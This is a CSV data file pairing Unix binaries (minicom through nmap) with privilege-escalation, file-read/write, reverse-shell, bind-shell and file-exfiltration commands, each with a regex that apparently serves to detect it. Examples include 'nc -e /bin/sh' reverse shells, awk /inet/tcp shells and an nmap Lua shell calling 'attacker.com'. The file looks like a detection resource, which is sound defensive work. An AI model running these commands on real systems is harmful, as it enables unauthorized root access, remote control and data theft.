Name,Function,ExampleCode,Regex,Notes
minicom,suid,./minicom -D /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.+),"Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh -p`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
"
more,shell,!/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+(?:/bin/(?:sh|bash))),
more,file-read,more file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+.+),
more,suid,./more file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+.+),
more,sudo,!/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+(?:/bin/(?:sh|bash))),
mosquitto,file-read,"mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mosquitto,suid,"./mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mosquitto,sudo,"sudo mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mount,sudo,"sudo mount -o bind /bin/sh /bin/mount
sudo mount",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mount\s*\-o\s+(?:/bin/(?:sh|bash))),Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.
msfconsole,shell,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
msfconsole,sudo,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
msgattrib,file-read,msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgattrib,sudo,sudo msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgattrib,suid,./msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,file-read,msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,sudo,sudo msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,suid,./msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,file-read,msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,sudo,sudo msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,suid,./msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,shell,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgfilter,file-read,"msgfilter -P -i ""LFILE"" /bin/cat","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program."
msgfilter,sudo,echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgfilter,suid,echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgmerge,file-read,msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,sudo,sudo msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,suid,./msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,file-read,msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,sudo,sudo msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,suid,./msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,file-read,"mtr --raw -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,sudo,"sudo mtr --raw -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
multitime,shell,multitime /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
multitime,suid,./multitime /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s*\-p\s+(?:/bin/(?:sh|bash))),
multitime,sudo,sudo multitime /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
mv,suid,"echo ""DATA"" > $TF
./mv $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mv,sudo,"echo ""DATA"" > $TF
sudo mv $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mysql,shell,mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,sudo,sudo mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,limited-suid,./mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,library-load,mysql --default-auth ../../../../../path/to/lib,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-\-default\-auth\s+.+),"A MySQL server must accept connections in order for this to work.

The following loads the `/path/to/lib.so` shared object.
"
nano,shell,"nano
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,shell,"nano -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
nano,file-write,"nano file_to_write
DATA
^O","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nano,file-read,nano file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,limited-suid,"./nano -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
nano,sudo,"sudo nano
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nasm,file-read,nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,suid,./nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,sudo,sudo nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,shell,"nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,non-interactive-reverse-shell,"nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
nawk,non-interactive-bind-shell,"nawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
nawk,file-write,"nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,file-read,"nawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,suid,"./nawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,sudo,"sudo nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,limited-suid,"./nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,reverse-shell,nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
nc,bind-shell,nc -l -p $LPORT -e /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.
nc,file-upload,"nc $RHOST $RPORT < ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
nc,file-download,"nc -l -p $LPORT > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file."
nc,sudo,sudo nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
nc,limited-suid,./nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
ncdu,shell,"ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,sudo,"sudo ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,limited-suid,"./ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncftp,shell,"ncftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
ncftp,suid,"./ncftp
!/bin/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s*\-p\s+(?:/bin/(?:sh|bash))),
ncftp,sudo,"sudo ncftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
neofetch,shell,"echo 'exec /bin/sh' >$TF
neofetch --config $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
neofetch,file-read,neofetch --ascii $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-ascii\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files."
neofetch,sudo,"echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,file-read,"nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,suid,"./nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,sudo,"sudo nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nice,shell,nice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nice,suid,./nice /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s*\-p\s+(?:/bin/(?:sh|bash))),
nice,sudo,sudo nice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nl,file-read,nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,suid,./nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,sudo,sudo nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,file-read,nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,suid,./nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,sudo,sudo nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,shell,"echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,shell,"nmap --interactive
nmap> !sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),"The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
nmap,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell.
